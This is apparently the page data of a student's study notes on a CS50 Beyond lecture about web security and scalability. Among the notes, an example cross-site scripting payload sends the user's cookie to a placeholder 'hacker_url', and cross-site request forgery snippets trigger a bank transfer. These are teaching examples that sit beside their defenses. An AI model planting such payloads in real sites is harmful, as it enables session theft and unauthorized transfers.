{"data":{"markdownRemark":{"html":"<blockquote>\n<p>Harvard's CS50 Beyond lecture 6 정리</p>\n</blockquote>\n<h3>Security</h3>\n<p>making sure that you, your application, and your users are protected by potential security threats and vulnerabilities</p>\n<h4>Git Vulnerabilities</h4>\n<ul>\n<li>\n<p>github repos: anyone can look at the code to take advantage of potential vulnerabilites (bcuz public as default)</p>\n<ul>\n<li>ex. git commit history: credentials can be exposed</li>\n</ul>\n</li>\n<li>\n<p>solutions: </p>\n<ul>\n<li>change the credentials</li>\n<li>git purge (overwrite history)</li>\n</ul>\n</li>\n</ul>\n<h4>HTML Vulnerabilities</h4>\n<ul>\n<li>phishing links: url leads to somewhere different from specified content</li>\n</ul>\n<h4>HTTPS and Cryptography</h4>\n<ul>\n<li>securely deliver data from one location to another location</li>\n<li>\n<p>use <strong>Cryptography</strong></p>\n<ul>\n<li>\n<p><strong>Secret-key Cryptography</strong>: use a singly key to encrypt and decrypt messages (key &#x26; ciphertext is transferred)</p>\n<ul>\n<li>problem: key is also sent through the internet</li>\n</ul>\n</li>\n<li>\n<p><strong>Public-key Cryptography</strong>: use public key to encrypt and private key to decrypt message </p>\n<ul>\n<li>receiver generates private and public key, shares only the public key to sender, and sender transfers ciphertext which receiver can decrypt using private key</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4>Environment Variables</h4>\n<ul>\n<li>don't store credentials in repos</li>\n<li>store credentials in environment variables</li>\n</ul>\n<h4>Database Vulnerabilities</h4>\n<p>database security concerns</p>\n<ul>\n<li>\n<p>passwords: passwords can be exposed</p>\n<ul>\n<li>solution: store hashed version of passwords</li>\n</ul>\n</li>\n<li>\n<p>data leaks:</p>\n<ul>\n<li>ex. forgot your password message: indication of which id exists or not</li>\n<li>ex. response time: can retrieve information based on response time</li>\n</ul>\n</li>\n</ul>\n<h4>SQL Injection</h4>\n<ul>\n<li>database queries that can inject problems to disrupt the SQL database</li>\n<li>solution: use libraries, escape characters</li>\n</ul>\n<h4>JavaScript Vulnerabilities</h4>\n<p>javascript opens a whole host of potential security vulnerabilites</p>\n<ul>\n<li>\n<p><strong>Cross-site Scripting</strong>: injecting javascript to expose private information</p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&lt;!-- injecting javascript into the request path (url) to reveal cookie of user --></span>\n/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script language-javascript\">document<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>'img src<span class=\"token operator\">=</span><span class=\"token string\">\"hacker_url?cookie=\"</span> <span class=\"token operator\">+</span> document<span class=\"token punctuation\">.</span>cookie <span class=\"token operator\">+</span> <span class=\"token string\">\">\"</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre></div>\n</li>\n<li>\n<p><strong>Cross-site Request Forgery</strong>: injecting methods to take advantage of requests to expose private information</p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&lt;!-- automatically fetches src (using request link) leading to transferring money to someone using credentials --></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>http://yourbank.com/transfer?to=brian&amp;amt=2800<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n<span class=\"token comment\">&lt;!-- another exampler of cross-site request forgery using a form --></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>http://yourbank.com/transfer<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>to<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>brian<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>amt<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>2800<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>click!<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></code></pre></div>\n</li>\n<li>\n<p>solution: use a CSRF(Cross-site Request Forgery) token for transfers</p>\n<ul>\n<li>each form has token and this is validated when sent to server </li>\n</ul>\n</li>\n</ul>\n<h3>Scalability</h3>\n<p>what we need to consider for having multiple people using the same application at the same time</p>\n<ul>\n<li><strong>vertical scaling</strong>: increase the size of the server</li>\n<li>\n<p><strong>horizontal scaling</strong>: increase the number of servers</p>\n<ul>\n<li>use load balancing to handle which server the client should be directed to</li>\n</ul>\n</li>\n</ul>\n<h4>Benchmarking</h4>\n<p>load testing the application to figure out how many users the server can handle</p>\n<h4>Load Balancing</h4>\n<ul>\n<li><strong>load balancer</strong>: device that handles which server the user should be directed to</li>\n<li>\n<p><strong>Load Balancing Methods</strong>: deciding which server to send the user</p>\n<ul>\n<li><strong>fewest connections</strong>: send user to the server w/ the fewest users; can spread out users but may be potentially computationally expensive </li>\n<li><strong>random choice</strong>: randomly assign server; quick but may flock to one server</li>\n<li><strong>round robin</strong>: go around each server</li>\n</ul>\n</li>\n<li>\n<p><strong>Session-aware Load Balancing</strong>: preserving sessions while using load balancing to serve pages (to solve problems where user is directed to different servers, losing session information)</p>\n<ul>\n<li>sticky sessions: load balancer remembers the particular server the user was first directed to</li>\n<li>sessions in database: store sessions in the database</li>\n<li>client-side session: store the session in the client-side</li>\n</ul>\n</li>\n</ul>\n<h4>Auto-scaling</h4>\n<p>automatically grows or shinks amount of servers based upon the load of the application</p>\n<ul>\n<li>cf) use heartbeat to detect which servers are alive or down</li>\n</ul>\n<h4>Scaling Databases</h4>\n<p>how to scale databases</p>\n<ul>\n<li><strong>Database Partitioning</strong>: separate tables in some way</li>\n<li>\n<p><strong>Database Replication</strong>: having multiple databases</p>\n<ul>\n<li><strong>singly-primary replication</strong>: can only write to the primary database while reading can be distributed to any of the databases (when written to primary db, updates other database based on the primary db)</li>\n<li><strong>multi-primary replication</strong>: each db is writable and readable, need to update all other databases when one database is changed</li>\n</ul>\n</li>\n<li>\n<p><strong>Caching</strong>: store data in cache to prevent constantly sending requests to database</p>\n<ul>\n<li>\n<p><strong>client-side caching</strong>: adding cache-control in HTTP header in response (from server) to indicate redundant data to be retrieved from cache next time</p>\n<ul>\n<li>\n<p><strong>entity tag</strong>: entity tag to indicate the version of the document to prevent redundant requests for page</p>\n<div class=\"gatsby-highlight\" data-language=\"http\"><pre class=\"language-http\"><code class=\"language-http\"><span class=\"token header-name keyword\">Cache-control:</span> max-age=86400\n<span class=\"token header-name keyword\">Etag:</span> \"74682038474827847837E83393739\"</code></pre></div>\n</li>\n</ul>\n</li>\n<li><strong>server-side caching</strong>: servers accessing cache instead of database for recent information</li>\n</ul>\n</li>\n</ul>","frontmatter":{"title":"CS50 Beyond lecture 6 - Security & Scalability","date":"2019-06-09","tags":["CS50","CS50 Beyond","Security","Scalability"]}}},"pageContext":{"isCreatedByStatefulCreatePages":false,"slug":"/CS50/cs50_beyond/lecture_6/"}}